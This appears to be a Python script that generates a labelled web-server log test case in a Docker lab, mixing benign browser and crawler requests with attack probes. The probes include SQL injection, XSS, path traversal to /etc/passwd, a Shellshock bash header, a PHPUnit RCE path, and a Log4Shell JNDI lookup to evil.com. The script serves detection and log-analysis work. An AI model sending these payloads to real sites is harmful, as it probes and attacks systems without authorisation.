import requests
import json
import random
import time
import subprocess
import os

# --- Configuration for the Test Case ---
TOTAL_LOG_LINES = 20
ATTACK_PERCENTAGE = 0.70
ORCHESTRATOR_API_URL = "http://localhost:8000/attack/curl"
LOG_OUTPUT_FILE = "victim_logs/test_case.log"

# --- Define Payloads ---

# 70% of 20 = 14 Attack Logs
# These mimic common scanning and probing techniques.
ATTACK_PAYLOADS = [
    # Probing for sensitive files/dirs
    {"target": "http://victim-website/admin.php"},
    {"target": "http://victim-website/.env"},
    {"target": "http://victim-website/config.php.bak"},
    {"target": "http://victim-website/wp-admin"},
    # Simple SQL Injection probe
    {"target": "http://victim-website/login?id=1'%20OR%20'1'='1"},
    # Simple Cross-Site Scripting (XSS) probe
    {"target": "http://victim-website/search?q=<script>alert(1)</script>"},
    # Log4Shell / JNDI probe
    {"target": "http://victim-website/", "args": "-H \"X-Api-Version: ${jndi:ldap://evil.com/a}\""},
    # Path Traversal probe
    {"target": "http://victim-website/static/../../../../etc/passwd"},
    # Using a known malicious user-agent
    {"target": "http://victim-website/", "args": "-A \"Nikto/2.1.5\""},
    {"target": "http://victim-website/", "args": "-A \"sqlmap/1.5.11\""},
    {"target": "http://victim-website/index.html", "args": "-A \"masscan/1.3.2\""},
    # Probing for server status
    {"target": "http://victim-website/server-status"},
    # Shellshock probe
    {"target": "http://victim-website/", "args": "-H \"User-Agent: () { :;}; /bin/bash -c 'echo vulnerable'\""},
    # PHP Unit RCE probe
    {"target": "http://victim-website/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"},
]

# 30% of 20 = 6 Normal Logs
# These mimic a benign user or a friendly web crawler.
NORMAL_PAYLOADS = [
    {"target": "http://victim-website/", "args": "-A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\""},
    {"target": "http://victim-website/index.html", "args": "-A \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\""},
    {"target": "http://victim-website/50x.html", "args": "-A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""},
    {"target": "http://victim-website/", "args": "-A \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)\""},
    {"target": "http://victim-website/index.html", "args": "-A \"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)\""},
    {"target": "http://victim-website/", "args": "-A \"Mozilla/5.0 (Linux; Android 10; SM-G975F)\""},
]

def make_request(payload):
    """Sends a single request to our Attack Orchestrator."""
    try:
        requests.post(ORCHESTRATOR_API_URL, json=payload, timeout=5)
        print(f"  Sent: {payload.get('target')}")
    except requests.exceptions.RequestException as e:
        print(f"  Error sending request: {e}")

def main():
    """Orchestrates the log generation and saving process."""
    print("--- Starting Test Case Log Generation ---")

    # 1. Clear previous logs from the victim container to start fresh
    # This ensures we only get the logs we are about to generate.
    print("\n[Step 1] Clearing old logs from victim container...")
    # A little trick: restart the container to clear its logs buffer
    subprocess.run(["docker", "restart", "victim-website"], capture_output=True, text=True)
    time.sleep(2) # Give nginx time to restart

    # 2. Calculate the number of each type of log to generate
    num_attack_logs = int(TOTAL_LOG_LINES * ATTACK_PERCENTAGE)
    num_normal_logs = TOTAL_LOG_LINES - num_attack_logs

    print(f"\n[Step 2] Preparing to generate {num_attack_logs} attack logs and {num_normal_logs} normal logs.")

    # 3. Create a shuffled list of requests to make
    attack_requests = random.sample(ATTACK_PAYLOADS, num_attack_logs)
    normal_requests = random.sample(NORMAL_PAYLOADS, num_normal_logs)
    
    all_requests = attack_requests + normal_requests
    random.shuffle(all_requests)

    # 4. Send all the requests to the orchestrator
    print("\n[Step 3] Sending requests to generate log entries...")
    for req in all_requests:
        make_request(req)
        time.sleep(0.1) # Stagger requests slightly for more realistic timestamps

    # 5. Fetch all logs and save them to the file
    print("\n[Step 4] Fetching logs from victim container...")
    result = subprocess.run(["docker", "logs", "victim-website"], capture_output=True, text=True)
    
    # The output from docker logs includes both stdout and stderr.
    # We combine them, split by lines, and filter out any empty lines.
    log_lines = result.stdout.splitlines() + result.stderr.splitlines()
    log_lines = [line for line in log_lines if line.strip()]

    # Ensure we only save the exact number of lines requested
    final_logs = log_lines[-TOTAL_LOG_LINES:]

    print(f"\n[Step 5] Saving {len(final_logs)} lines to {LOG_OUTPUT_FILE}")
    with open(LOG_OUTPUT_FILE, "w") as f:
        f.write("\n".join(final_logs))

    print("\n--- Test case log file generated successfully! ---")

if __name__ == "__main__":
    main()